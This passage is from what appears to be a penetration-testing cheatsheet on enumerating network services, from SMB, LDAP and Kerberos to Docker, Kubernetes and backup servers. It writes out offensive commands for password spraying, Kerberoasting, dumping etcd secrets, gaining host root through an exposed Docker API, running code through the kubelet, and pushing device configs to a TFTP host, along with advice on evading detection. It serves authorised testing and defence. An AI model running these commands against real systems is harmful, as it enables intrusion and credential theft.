# Extract per-port host list
awk '/Ports:/{ip=$2; ports=substr($0,index($0,"Ports:")+7); \
     n=split(ports,a,","); for(i=1;i<=n;i++){split(a[i],b,"/"); \
     if(b[2]=="open") print ip":"b[1]}}' scan.gnmap | sort -u

# Convert XML → HTML
xsltproc scan.xml -o report.html

# nmap-parse-output (community tool for cleaner parsing)
# https://github.com/ernw/nmap-parse-output

# Pipeline handoff: open ports → service-specific tools
# SMB
grep "445/open" scan.gnmap | awk '{print $2}' > smb_hosts.txt
nxc smb -L smb_hosts.txt --shares -u '' -p ''

# Web
awk '/(80|443|8080|8443)\/open/{print $2}' scan.gnmap | httpx -silent -title -tech-detect

# RDP
grep "3389/open" scan.gnmap | awk '{print $2}' > rdp_hosts.txt

# WinRM
grep -E "(5985|5986)/open" scan.gnmap | awk '{print $2}' > winrm_hosts.txt
```

```
═══════════════════════════════════════════════════════════
SECTION 2 — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
Enables → §3 service enumeration (every open port = service to probe)
Enables → §4 edge-appliance fingerprinting (port 443 + specific paths)
Enables → §8 vulnerability scanning (Nuclei targets pulled from scan output)
Prereq → §1 host discovery (don't scan ports on dead hosts; wastes effort + noise)
Alternative → If active scanning is too noisy, fall back to passive recon
              §2.3 (Shodan/Censys) for IP-range port inventory
```

---

## 3 — SERVICE & APPLICATION ENUMERATION

> **Typical chains through this section:** Open port from §2 → version banner → CVE matching against version → authenticated enum if creds available → handoff to credential-access / lateral-movement playbooks (other cheatsheets in series). Identity-plane enumeration parallels endpoint enumeration.

### 3.1 — SMB / NetBIOS

```bash
# ═══════════════════════════════════════════════════════════
# SMB ENUMERATION — UNAUTHENTICATED + AUTHENTICATED
# MITRE ATT&CK: T1135 (Network Share Discovery), T1018, T1083
#               T1087.002 (Account Discovery: Domain Account)
# NOISE LEVEL:  MEDIUM (auth attempts fire 4625; share enum fires 5140/5145)
# DETECTION (Windows event log):
#   - 4624 Type 3 (network logon) per session
#   - 4625 (logon failure) on bad creds
#   - 5140 (network share accessed)
#   - 5145 (detailed file share access)
# DETECTION (MDI):
#   - "Suspected identity theft (pass-the-hash)" on certain auth patterns
#   - "Reconnaissance using directory services" for AD-context queries
# ═══════════════════════════════════════════════════════════

# Nmap NSE
nmap --script=smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln* \
     -p 445 <target>

# enum4linux-ng (cddmp/enum4linux-ng — v1.3.7+ active; original deprecated)
enum4linux-ng -A <target>                     # All checks

# NetExec (Pennyw0rth/NetExec — canonical CME successor since Dec 2023)
nxc smb <target>                              # Banner / OS / Domain
nxc smb <target> --shares -u '' -p ''         # Null session (often blocked
                                              # in modern Windows defaults)
nxc smb <target> --shares -u 'guest' -p ''    # Guest session
nxc smb <target> --users -u '' -p ''
nxc smb <target> --groups -u '' -p ''
nxc smb <target> --pass-pol -u '' -p ''       # Password policy
nxc smb <target> --rid-brute 5000 -u '' -p '' # RID cycling

# Authenticated SMB enumeration (low-priv user creds)
nxc smb <target> -u user -p 'pass' --shares
nxc smb <target> -u user -p 'pass' --users
nxc smb <target> -u user -p 'pass' --groups
nxc smb <target> -u user -p 'pass' --loggedon-users
nxc smb <target> -u user -p 'pass' --sessions
nxc smb <target> -u user -p 'pass' --pass-pol

# smbclient (single-host share listing)
smbclient -L //<target>/ -N                   # Null
smbclient -L //<target>/ -U 'user%pass'       # Authenticated
smbclient //<target>/share -U 'user%pass'     # Connect to share

# smbmap (share permission map)
smbmap -H <target> -u '' -p ''
smbmap -H <target> -u user -p pass -R         # Recursive

# rpcclient (still useful for RPC-side enum)
rpcclient -U "" -N <target>
# Inside rpcclient:
#   srvinfo
#   enumdomusers
#   queryuser <RID>
#   enumdomgroups
#   querygroup <RID>
#   getdompwinfo
#   lsaquery

# SMB SIGNING CHECK (for NTLM relay viability — see lateral movement cheatsheet)
nxc smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
# IMPORTANT: Server 2025 (released Nov 2024) makes SMB signing MANDATORY
# by default. NTLM relay landscape against fresh deployments is significantly
# degraded; legacy environments still vulnerable.

# Modern Windows defaults shift (high-impact for null-session reliance):
#   Server 2003 / XP        — null sessions fully open by default (legacy)
#   Server 2008 / Win 7+    — null sessions restricted by default
#   Server 2019 / Win 10+   — null sessions further restricted
#   Server 2025             — SMB signing mandatory by default; null
#                             sessions and unsigned SMB largely unusable
```

### 3.2 — LDAP

```bash
# ═══════════════════════════════════════════════════════════
# LDAP ENUMERATION — ROOTDSE + AUTHENTICATED
# MITRE ATT&CK: T1087.002 (Account Discovery), T1069.002 (Domain Groups),
#               T1018, T1482 (Domain Trust Discovery)
# NOISE LEVEL:  MEDIUM (rootDSE near-zero; large-volume queries logged)
# DETECTION (MDI):
#   - "Reconnaissance using directory services queries"
#   - "Suspicious LDAP search via SAMR" (SAMR-over-LDAP)
#   - "Honeytoken account login attempt" (if MDI honeytokens deployed)
# DETECTION (Windows DC events): 1644 (LDAP search), 4662 (object access)
# ═══════════════════════════════════════════════════════════

# rootDSE — UNAUTHENTICATED, returns directory metadata (always allowed)
ldapsearch -x -H ldap://<target> -b "" -s base "*" "+"
# Reveals:
#   - defaultNamingContext (DC=corp,DC=target,DC=local)
#   - rootDomainNamingContext, configurationNamingContext, schemaNamingContext
#   - supportedLDAPVersion (2 or 3)
#   - supportedSASLMechanisms (GSSAPI, GSS-SPNEGO, EXTERNAL, DIGEST-MD5)
#   - supportedControl (which LDAP controls are honored)
#   - dnsHostName (full DC hostname)
#   - serverName (CN= path of this DC)
#   - currentTime (DC clock — useful for Kerberos timing attacks)
#   - dsServiceName (NTDS Settings of this DC)

# Targeted rootDSE attribute extraction
ldapsearch -x -H ldap://<target> -b "" -s base namingContexts
ldapsearch -x -H ldap://<target> -b "" -s base supportedSASLMechanisms

# IMPORTANT: Modern Windows (Server 2022+, fully baseline 2025) defaults
# to LDAP signing required AND LDAP channel binding required when over TLS.
# Anonymous LDAP queries to rootDSE still allowed; queries against DIT
# require auth + signing. Microsoft hardening since CVE-2017-8563.

# Authenticated LDAP enumeration (low-priv user; over LDAPS recommended)
ldapsearch -x -H ldaps://<target>:636 \
  -D "user@target.local" -w 'password' \
  -b "DC=target,DC=local" "(objectClass=user)" sAMAccountName

# All users (sAMAccountName only — minimal payload)
ldapsearch -x -H ldap://<target> \
  -D "user@target.local" -w 'pass' \
  -b "DC=target,DC=local" "(&(objectCategory=person)(objectClass=user))" \
  sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# All computers
ldapsearch -x -H ldap://<target> \
  -D "user@target.local" -w 'pass' \
  -b "DC=target,DC=local" "(objectCategory=computer)" \
  dnsHostName operatingSystem | grep -E "dnsHostName|operatingSystem"

# Service Principal Names (Kerberoastable accounts)
ldapsearch -x -H ldap://<target> \
  -D "user@target.local" -w 'pass' \
  -b "DC=target,DC=local" \
  "(&(objectCategory=person)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# NetExec LDAP enumeration (most ergonomic)
nxc ldap <DC> -u user -p pass --users
nxc ldap <DC> -u user -p pass --groups
nxc ldap <DC> -u user -p pass --get-sid
nxc ldap <DC> -u user -p pass --trusted-for-delegation
nxc ldap <DC> -u user -p pass --password-not-required
nxc ldap <DC> -u user -p pass --admin-count
nxc ldap <DC> -u user -p pass --asreproast asrep_hashes.txt
nxc ldap <DC> -u user -p pass --kerberoasting kerb_hashes.txt
nxc ldap <DC> -u user -p pass --gmsa
nxc ldap <DC> -u user -p pass --bloodhound -d target.local --collection All

# BloodyAD (cravaterouge — AD enumeration + abuse with creds)
bloodyAD -d target.local -u user -p pass --host <DC> get object 'CN=Administrator,CN=Users,DC=target,DC=local'
bloodyAD -d target.local -u user -p pass --host <DC> get writable
bloodyAD -d target.local -u user -p pass --host <DC> get bloodhound
```

### 3.3 — Kerberos

```bash
# ═══════════════════════════════════════════════════════════
# KERBEROS USER + SPN ENUMERATION
# MITRE ATT&CK: T1087.002, T1558.003 (Kerberoasting),
#               T1558.004 (AS-REP Roasting), T1606 (Forge Web Credentials)
# NOISE LEVEL:  HIGH — BURNED in modern enterprise with MDI deployed
# DETECTION (MDI — primary defender):
#   - "Suspected user enumeration" — high-fidelity alert on kerbrute patterns
#   - "Suspected AS-REP Roasting" — fires on AS_REQ without pre-auth
#   - "Suspected Kerberos SPN exposure (Kerberoasting)" — bulk TGS requests
#   - "Suspected DCSync attack (replication of directory services)"
# DETECTION (Windows DC events):
#   - 4768 (TGT requested) per attempt
#   - 4771 (pre-auth failed) on user-enumeration probes
#   - 4769 (TGS requested) per Kerberoasting target
# CITATION: Microsoft Learn — Defender for Identity alerts reference
#           https://learn.microsoft.com/en-us/defender-for-identity/alerts-mdi-classic
# ═══════════════════════════════════════════════════════════

# kerbrute (ropnop/kerbrute — v1.0.3 Dec 2025; minimal recent activity but
# still functional and canonical)
# User enumeration (NO creds required — just a valid domain)
kerbrute userenum -d target.local --dc <DC_IP> users.txt

# Password spray (with usernames + a single password)
kerbrute passwordspray -d target.local --dc <DC_IP> users.txt 'Spring2026!'

# Authenticate-test (validate one cred)
kerbrute bruteforce -d target.local --dc <DC_IP> creds.txt
# creds.txt format: username:password per line

# AS-REP Roasting (no-preauth users → offline crackable hash)
nxc ldap <DC> -u user -p pass --asreproast asrep_hashes.txt
# Or impacket directly
GetNPUsers.py target.local/user:pass -dc-ip <DC_IP> -request \
  -outputfile asrep.hashes
# Hashcat: hashcat -m 18200 asrep.hashes wordlist.txt

# Kerberoasting (TGS requests for SPN-bearing accounts)
nxc ldap <DC> -u user -p pass --kerberoasting kerb_hashes.txt
GetUserSPNs.py target.local/user:pass -dc-ip <DC_IP> -request -outputfile kerb.hashes
# Hashcat: hashcat -m 13100 kerb.hashes wordlist.txt

# PKINIT / ESC8 enumeration (AD CS adjacent — see active directory cheatsheet)
# Detects accounts with msDS-KeyCredentialLink set (shadow credentials path)
nxc ldap <DC> -u user -p pass --query \
  "(&(objectClass=user)(msDS-KeyCredentialLink=*))" \
  "sAMAccountName"

# IMPORTANT: kerbrute generates one 4768 (or 4771 on miss) event PER ATTEMPT.
# Modern enterprises with MDI deployed flag this as high-fidelity alert
# within seconds. Adjust strategy for environment:
#   - MDI absent (legacy / SMB / dev / staging) — proceed
#   - MDI present (production enterprise default 2024+) — strongly avoid
#     bulk userenum; use targeted probes only or rely on passive recon
#     §4 personnel intel for username derivation
```

### 3.4 — DNS Active Enumeration

```bash
# ═══════════════════════════════════════════════════════════
# ACTIVE DNS RECON BEYOND PASSIVE METHODS
# MITRE ATT&CK: T1590.002 (DNS), T1596.001 (Passive DNS), T1018
# NOISE LEVEL:  LOW (single zone-transfer attempt) to HIGH (subdomain brute)
# DETECTION:    Authoritative DNS volume; modern DNS-firewall (Infoblox /
#               Cisco Umbrella) flags rapid-query patterns from same source
# ═══════════════════════════════════════════════════════════

# Zone transfer (rare in modern config, but still tried; reveals entire zone)
dig @<DNS_SERVER> target.com AXFR
dig @<DNS_SERVER> target.com IXFR=0          # Incremental zone transfer

dnsrecon -d target.com -t axfr               # Automated zone transfer attempt
dnsrecon -d target.com -t std                # Standard DNS enum
dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

fierce --domain target.com --dns-servers <DNS>

# DNSSEC zone walking (NSEC enumeration — works on misconfigured DNSSEC)
ldns-walk @<DNS_SERVER> target.com           # Walk NSEC records
nsec3walker target.com                       # NSEC3 (harder)

# Internal DNS enumeration (post-access)
dnsrecon -r 10.0.0.0/24 -n <DC_IP>           # Reverse lookup subnet

# Reverse PTR enumeration via Nmap (uses internal DNS server)
nmap -sL 10.0.0.0/24 --dns-servers <DC_IP>

# DNS subdomain takeover detection (passive recon §1.5 covers some;
# active confirms by checking CNAME → unclaimed cloud resource)
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v
nuclei -l subdomains.txt -t takeovers/ -severity high

# DoH / DoT detection for active probing of a host's resolver capability
# (recon-side: identifies upstream DNS infrastructure)
curl --doh-url https://1.1.1.1/dns-query -s "https://target.com/" -o /dev/null

# DNS amplification check (deprecated DDoS vector; still indicates open
# resolver — sometimes useful for pivot/reflection in targeted scenarios)
dig @<target> ANY isc.org +edns=0 +nocookie | wc -c  # Response size
```

### 3.5 — SNMP

```bash
# ═══════════════════════════════════════════════════════════
# SNMP ENUMERATION — v1/v2c COMMUNITY BRUTE + v3
# MITRE ATT&CK: T1046, T1018, T1057 (Process Discovery)
# NOISE LEVEL:  MEDIUM (community brute) to LOW (single walk with known string)
# DETECTION:    Network device logs; SNMP traps may fire on auth fail;
#               modern SIEM rules look for SNMP from non-management subnets
# ═══════════════════════════════════════════════════════════

# Community-string brute (v1/v2c — still common on legacy + IoT)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>
hydra -P /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt -t 64 \
      <target> snmp                          # Faster brute via Hydra

# Walk MIB with known community
snmpwalk -v2c -c public <target>                       # Full walk
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.1.0   # System description
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.4.2.1.2 # Running processes
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.25.6.3.1.2 # Installed software
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25 # Windows user accounts
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.6.13.1.3 # TCP listening ports
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.4.20    # Network interfaces / IPs
snmpwalk -v2c -c public <target> 1.3.6.1.4.1.9.9.23  # Cisco CDP neighbors
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.17      # Bridge/MAC table

# Nmap SNMP scripts
nmap -sU --script=snmp-info,snmp-brute,snmp-interfaces,snmp-processes,\
snmp-netstat,snmp-sysdescr,snmp-win32-services,snmp-win32-software \
     -p 161 <target>

# SNMP v3 partial enumeration (auth required; identify ENGINE-ID + supported
# auth/priv algorithms first)
snmpwalk -v3 -l noAuthNoPriv -u username <target>     # Probe auth requirements

# SNMP v3 with creds
snmpwalk -v3 -u user -l authPriv -a SHA -A "authpass" -x AES -X "privpass" <target>

# Write community strings (read-write — RARELY misconfigured but devastating
# when found; allows config push, e.g., TFTP-config-pull from network device)
snmpset -v2c -c private <target> 1.3.6.1.4.1.9.2.1.55.<TFTP_IP> s "running-config"
# This is DESTRUCTIVE-ADJACENT — use only with explicit RoE
```

```
═══════════════════════════════════════════════════════════
§3 (PART 1) — RELATED & FOLLOW-ON
═══════════════════════════════════════════════════════════
SMB enum → §03 Initial Access (NTLM relay, SMB pivot)
LDAP enum → §08 Active Directory deep dive (BloodHound CE collection)
Kerberos enum → §05 Privilege Escalation (Kerberoasting/AS-REP roasting hashes
                handed off to offline cracking)
DNS active → §04 Persistence (DNS-takeover registration for C2 hostnames)
SNMP enum → §06 Lateral Movement (network-device pivot via misconfigured
            write-community)
```

### 3.6 — SSH / FTP / SMTP / NFS / iSCSI

```bash
# ═══════════════════════════════════════════════════════════
# SSH (22)
# MITRE ATT&CK: T1046, T1110.001 (Brute Force: Password Guessing)
# NOISE LEVEL:  LOW (single-cred test) to HIGH (mass brute)
# DETECTION:    sshd authpriv logs; fail2ban-class auto-blocking
# ═══════════════════════════════════════════════════════════
ssh-audit <target>                            # SSH algos / versions / CVE check
                                              # v3.3.0+ supports OpenSSH 9.x policies
nmap --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p 22 <target>

# OpenSSH version in banner
nc -nv <target> 22 < /dev/null 2>&1 | grep -i ssh

# CVE-2024-6387 (regreSSHion) — signal-handler race in OpenSSH 8.5p1 - 9.7p1
# Detection: any OpenSSH 8.5-9.7 banner = potentially vulnerable
# Exploitation: PoC exists, low reliability against modern glibc; documented
# successful exploitation reported by Qualys research

# ═══════════════════════════════════════════════════════════
# FTP (21)
# MITRE ATT&CK: T1046, T1083, T1078 (Valid Accounts)
# NOISE LEVEL:  LOW (single connect) to MEDIUM (anonymous-listing)
# ═══════════════════════════════════════════════════════════
nmap --script=ftp-anon,ftp-bounce,ftp-vuln* -p 21 <target>
ftp <target>                                  # Try anonymous (anonymous:blank)
ncftpls ftp://<target>                        # Non-interactive listing

# vsftpd / ProFTPD / Pure-FTPd / Microsoft IIS FTP — version-dependent CVEs

# ═══════════════════════════════════════════════════════════
# SMTP (25 / 465 / 587)
# MITRE ATT&CK: T1046, T1589.002 (Email Addresses), T1078
# NOISE LEVEL:  LOW (banner) to MEDIUM (user enum via VRFY/EXPN/RCPT)
# DETECTION:    Mail-server logs (Postfix /var/log/mail.log;
#               Exchange Message Tracking log)
# ═══════════════════════════════════════════════════════════
nc -nv <target> 25                            # Banner grab
nmap --script=smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln* \
     -p 25,465,587 <target>

# User enumeration via VRFY (heavily disabled in modern MTAs)
smtp-user-enum -M VRFY -U users.txt -t <target>

# User enumeration via RCPT TO (more reliable but more invasive)
smtp-user-enum -M RCPT -U users.txt -t <target>

# User enumeration via EXPN (mailing-list expansion — disabled by default
# in Postfix/Sendmail since ~2010)
smtp-user-enum -M EXPN -U users.txt -t <target>

# STARTTLS detection
testssl.sh --starttls smtp <target>:25

# ═══════════════════════════════════════════════════════════
# NFS (2049, plus 111 for portmap)
# MITRE ATT&CK: T1135 (Network Share Discovery), T1083
# NOISE LEVEL:  LOW (showmount) to MEDIUM (mount + traverse)
# ═══════════════════════════════════════════════════════════
showmount -e <target>                         # List NFS exports (rpcbind 111)
nmap --script=nfs-ls,nfs-showmount,nfs-statfs -p 2049 <target>

# Mount and explore
mkdir /mnt/nfs && mount -t nfs <target>:/export /mnt/nfs
ls -la /mnt/nfs

# NFS v4 distinct from v3 (v4 includes auth + ACLs + crypto;
# v3 commonly export-list-permissive)
showmount -e <target>                         # v3
mount -t nfs4 <target>:/export /mnt/nfs       # v4 mount

# ═══════════════════════════════════════════════════════════
# iSCSI (3260)
# MITRE ATT&CK: T1083, T1135, T1018
# NOISE LEVEL:  LOW (target discovery) to MEDIUM (login attempt)
# ═══════════════════════════════════════════════════════════
# Target discovery (no auth required for portal probe)
iscsiadm -m discovery -t sendtargets -p <target>:3260
# Lists IQNs (iSCSI Qualified Names) — often telegraph use
# (e.g., iqn.1991-05.com.microsoft:srv-backup-prod)

# Manual portal probe
nc -nv <target> 3260                          # Banner / portal info
nmap --script=iscsi-info,iscsi-brute -p 3260 <target>
```

### 3.7 — Database Services

```bash
# ═══════════════════════════════════════════════════════════
# MSSQL (1433)
# MITRE ATT&CK: T1046, T1078, T1059.005 (Visual Basic — for xp_cmdshell)
# NOISE LEVEL:  MEDIUM
# DETECTION:    SQL Server audit logs; Defender for SQL alerts on 2024+
#               SQL Server installs with Defender plan enabled
# ═══════════════════════════════════════════════════════════
nmap --script=ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password,\
ms-sql-config -p 1433 <target>

# NetExec MSSQL
nxc mssql <target> -u sa -p passwords.txt
nxc mssql <target> -u sa -p 'pass' --query "SELECT @@version"
nxc mssql <target> -u sa -p 'pass' -x "whoami"  # xp_cmdshell (if enabled)

# impacket-mssqlclient (modern client)
mssqlclient.py 'TARGET/sa:pass@<target>' -windows-auth

# CVE-2025-21323 (RDP NTLM relay) and similar adjacent — see RDP §3.9

# ═══════════════════════════════════════════════════════════
# MySQL (3306) / MariaDB
# ═══════════════════════════════════════════════════════════
nmap --script=mysql-info,mysql-empty-password,mysql-users,mysql-databases,\
mysql-variables,mysql-vuln-cve2012-2122 -p 3306 <target>
mysql -h <target> -u root -p'' -e "SHOW DATABASES;"
hydra -L users.txt -P pass.txt mysql://<target>

# ═══════════════════════════════════════════════════════════
# PostgreSQL (5432)
# ═══════════════════════════════════════════════════════════
nmap --script=pgsql-brute -p 5432 <target>
psql -h <target> -U postgres -W            # Prompts password

# ═══════════════════════════════════════════════════════════
# MongoDB (27017, 27018, 27019)
# MITRE ATT&CK: T1046, T1083
# NOISE LEVEL:  LOW for unauth probe; CVE history: defaultless-bind era
#               (pre-3.6) made MongoDB the largest source of unauth-DB
#               compromises in mid-2010s
# ═══════════════════════════════════════════════════════════
nmap --script=mongodb-info,mongodb-databases -p 27017 <target>
mongosh "mongodb://<target>:27017/admin"      # Modern shell (replaces mongo)
mongosh "mongodb://<target>:27017/admin" --eval "db.adminCommand('listDatabases')"

# MongoDB 3.6+ defaults to bind 127.0.0.1; legacy installs commonly bind 0.0.0.0
# Atlas-hosted MongoDB requires TLS + auth always

# ═══════════════════════════════════════════════════════════
# REDIS (6379, 6380 TLS)
# MITRE ATT&CK: T1046, T1059, T1078
# NOISE LEVEL:  LOW for PING; HIGH for CONFIG SET / SLAVEOF abuse
# ═══════════════════════════════════════════════════════════
redis-cli -h <target> PING                    # Test unauth access
redis-cli -h <target> INFO                    # Server info
redis-cli -h <target> CLIENT LIST             # Active connections
redis-cli -h <target> CONFIG GET *            # Config dump
redis-cli -h <target> KEYS '*'                # Keyspace listing (BLOCKING — bad
                                              # in production)

# Redis exposed without password is widely seen on:
#   - Self-hosted apps where developers forgot REQUIREPASS
#   - Default Docker container configs (redis:latest binds 0.0.0.0)
#   - K8s services accidentally exposed via LoadBalancer

# ═══════════════════════════════════════════════════════════
# OPENSEARCH / ELASTIC (9200, 9300)
# MITRE ATT&CK: T1046, T1083
# NOISE LEVEL:  LOW (cluster-info GET) to MEDIUM (full-index dump)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:9200/"               # Cluster info (unauth = misconfig)
curl -s "http://<target>:9200/_cat/indices?v" # All indices
curl -s "http://<target>:9200/_cluster/health"
curl -s "http://<target>:9200/.kibana/_search?size=10000" # Kibana saved objects

# Elastic Security (formerly X-Pack) auth required by default since v7.0+
# Self-hosted older deployments often have auth disabled

# ═══════════════════════════════════════════════════════════
# CLICKHOUSE (8123 HTTP, 9000 native)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8123/?query=SHOW%20DATABASES"
curl -s "http://<target>:8123/?query=SHOW%20TABLES%20FROM%20<db>"

# ═══════════════════════════════════════════════════════════
# INFLUXDB (8086)
# ═══════════════════════════════════════════════════════════
curl -s "http://<target>:8086/query?q=SHOW+DATABASES" -G

# ═══════════════════════════════════════════════════════════
# CASSANDRA (9042 native, 7199 JMX, 7000 inter-node)
# ═══════════════════════════════════════════════════════════
nmap --script=cassandra-info,cassandra-brute -p 9042 <target>
cqlsh <target> -u cassandra -p cassandra      # Default creds

# ═══════════════════════════════════════════════════════════
# SNOWFLAKE — endpoint pattern (cloud-hosted only)
# Pattern: <account>.snowflakecomputing.com
# Probe via DNS:
nslookup target.snowflakecomputing.com
# 200/302 with Snowflake login page = tenant exists
curl -sI "https://target.snowflakecomputing.com/" | head -3
```

### 3.8 — Container & Orchestration (CORRECTED kubelet vs API server)

```bash
# ═══════════════════════════════════════════════════════════
# DOCKER DAEMON API (2375 unauth, 2376 TLS)
# MITRE ATT&CK: T1046, T1059, T1610 (Deploy Container)
# NOISE LEVEL:  LOW probe; HIGH (RCE-equivalent) if accessible
# DETECTION:    EDR on Docker host observes container creation;
#               cloud SCC/CSPM detects exposed Docker daemon
# ═══════════════════════════════════════════════════════════
# Probe (port 2375 = unauth Docker API; 2376 = TLS)
curl -s http://<target>:2375/version          # Docker version + system info
curl -s http://<target>:2375/info             # Full system info (host details)
curl -s http://<target>:2375/containers/json  # All containers
curl -s http://<target>:2375/images/json      # All images

# If accessible: immediate host root via container creation
# (DESTRUCTIVE — only with explicit RoE)
docker -H tcp://<target>:2375 ps
docker -H tcp://<target>:2375 run -v /:/mnt --rm -it ubuntu chroot /mnt /bin/bash

# Containerd / CRI-O sockets (Unix sockets — only accessible via foothold;
# typical paths on host: /run/containerd/containerd.sock, /run/crio/crio.sock)
# Recon: ls -la /run/*/socks if you have host filesystem access

# ═══════════════════════════════════════════════════════════
# KUBERNETES — API SERVER (6443) vs KUBELET (10250) — CORRECTED
# MITRE ATT&CK: T1046, T1083, T1610, T1613 (Container & Resource Discovery)
# NOISE LEVEL:  LOW (probe) to HIGH (broad enumeration if anonymous allowed)
# DETECTION:    Kubernetes audit logs (if enabled); CSPM (Wiz / Lacework /
#               Orca) detects unauth API access
# ═══════════════════════════════════════════════════════════
# CRITICAL CORRECTION: API server (6443) anonymous auth has been DISABLED
# by default since K8s v1.10. Kubelet (10250) anonymous auth has been
# permitted historically; FINE-GRAINED kubelet authorization only graduated
# to GA on 24 April 2026 in K8s v1.36.
# Source: https://kubernetes.io/blog/2026/04/24/kubernetes-v1-36-fine-grained-kubelet-authorization-ga/
#
# Translation: in production clusters at sub-1.36 (the majority of fleets
# in early 2026), kubelet 10250 STILL frequently permits anonymous access
# to /pods, /runningpods, /configz, /metrics, and /exec endpoints.

# ─── API SERVER (6443) — typically authenticated ───────────
curl -sk https://<target>:6443/api               # 401/403 = auth required (norm)
curl -sk https://<target>:6443/version           # Sometimes anonymously allowed
curl -sk https://<target>:6443/api/v1/namespaces # 200 = critical misconfig
curl -sk https://<target>:6443/openapi/v2        # OpenAPI spec (auth-protected
                                                 # in modern; legacy may leak)

# ─── KUBELET (10250) — anonymous READ frequently still allowed ─
curl -sk https://<target>:10250/pods             # All pods on this node
curl -sk https://<target>:10250/runningpods      # Currently running pods
curl -sk https://<target>:10250/configz          # Kubelet config (LEAKS:
                                                 # cluster CA, node-config,
                                                 # featureGates, paths)
curl -sk https://<target>:10250/metrics          # Prometheus metrics
curl -sk https://<target>:10250/healthz
curl -sk https://<target>:10250/spec/            # cAdvisor v1 endpoint
curl -sk https://<target>:10250/stats/summary    # Resource stats per pod

# Kubelet /exec endpoint — UNAUTH RCE on misconfigured nodes
# (rare but devastating; test with care; DESTRUCTIVE)
curl -sk -X POST "https://<target>:10250/exec/<namespace>/<pod>/<container>?command=id&input=1&output=1&tty=1"

# ─── KUBELET (10255) — DEPRECATED read-only port ───────────
# Removed by default in K8s 1.16+; legacy clusters still expose
curl -s http://<target>:10255/pods
curl -s http://<target>:10255/metrics

# ─── ETCD (2379) — KUBERNETES BACKEND DATABASE ─────────────
# Critical-impact if exposed; contains EVERY cluster secret
curl -sk https://<target>:2379/version
etcdctl --endpoints=http://<target>:2379 get / --prefix --keys-only
etcdctl --endpoints=http://<target>:2379 get /registry/secrets --prefix

# ─── KUBE-SCHEDULER / CONTROLLER-MANAGER metrics ───────────
# Often accessible read-only on the master nodes
curl -sk https://<target>:10257/metrics       # Controller-manager
curl -sk https://<target>:10259/metrics       # Scheduler

# Tools:
# kube-hunter (Aqua Security) — automated K8s vulnerability scanner
kube-hunter --remote <target>
# kubeletctl — kubelet-API interaction toolkit
kubeletctl pods --server <target>
kubeletctl scan rce --server <target>
# peirates — K8s pentest swiss-army-knife (post-pod-foothold)

# Container Runtime Interface (CRI) sockets (only via foothold):
# /var/run/dockershim.sock (legacy), /run/containerd/containerd.sock
```

### 3.9 — RDP / WinRM / VNC

```bash
# ═══════════════════════════════════════════════════════════
# RDP (3389)
# MITRE ATT&CK: T1021.001 (Remote Services: RDP)
# NOISE LEVEL:  LOW (probe) to HIGH (auth attempts)
# DETECTION:    4624/4625 events; MDI: "Suspected brute-force attack (RDP)"
# ═══════════════════════════════════════════════════════════
nmap --script=rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020 \
     -p 3389 <target>

# rdp-sec-check.pl (NLA/CredSSP analysis)
# https://labs.portcullis.co.uk/tools/rdp-sec-check/
rdp-sec-check.pl <target>

# Modern RDP CVEs in 2024-2026 (worth flagging during recon):
# - CVE-2024-38077 (Windows Remote Desktop Licensing Service — RDS LSA RCE,
#   pre-auth, CVSS 9.8; widespread but limited public PoC reliability)
# - CVE-2025-21323 (RDP NTLM relay — patched Jan 2025; legacy boxes still
#   vulnerable)

# ═══════════════════════════════════════════════════════════
# WinRM (5985 HTTP / 5986 HTTPS)
# MITRE ATT&CK: T1021.006 (Windows Remote Management)
# NOISE LEVEL:  LOW (probe) to HIGH (cmd execution)
# DETECTION:    EDR on target host; 4624 Type 3
# ═══════════════════════════════════════════════════════════
nxc winrm <target> -u admin -p password
nxc winrm <target> -u admin -p password -x "whoami"  # Single command exec
evil-winrm -i <target> -u admin -p password          # Interactive shell

# ═══════════════════════════════════════════════════════════
# VNC (5900-5906)
# MITRE ATT&CK: T1021.005 (Remote Services: VNC)
# ═══════════════════════════════════════════════════════════
nmap --script=vnc-info,vnc-brute,realvnc-auth-bypass -p 5900 <target>
vncviewer <target>:0                          # Default display
```

### 3.10 — Backup / Management Infrastructure

```bash
# ═══════════════════════════════════════════════════════════
# VEEAM BACKUP & REPLICATION — TOP RANSOMWARE PIVOT
# MITRE ATT&CK: T1046, T1078, T1565 (Data Manipulation)
# NOISE LEVEL:  LOW (probe) to HIGH (auth attempts)
# ═══════════════════════════════════════════════════════════
# Common ports: 9419 (VBR Console), 9392 (Mount Server), 6172 (PowerShell remoting)
nmap -p 9419,9392,6172 -sV --script=http-title <target>

# CVE-2024-40711 — unauthenticated RCE in Veeam Backup & Replication
# (CVSS 9.8); exploited by Frag, Akira, Fog ransomware groups since Sept 2024
# Source: https://www.rapid7.com/blog/post/2024/09/09/etr-multiple-vulnerabilities-in-veeam-backup-and-replication/

# CVE-2025-23120 — domain-joined Veeam server RCE; ANY domain user can exploit
# (CVSS 9.9); patched March 2025
# Source: https://www.rapid7.com/blog/post/2025/03/19/etr-critical-veeam-backup-and-replication-cve-2025-23120/

# Detection of Veeam (banner / version) drives priority — Veeam holds the
# crown jewels backup credentials + restore-as-anyone capability

# ═══════════════════════════════════════════════════════════
# VMWARE vCENTER (443, 5480 mgmt, 9443)
# MITRE ATT&CK: T1046, T1078
# ═══════════════════════════════════════════════════════════
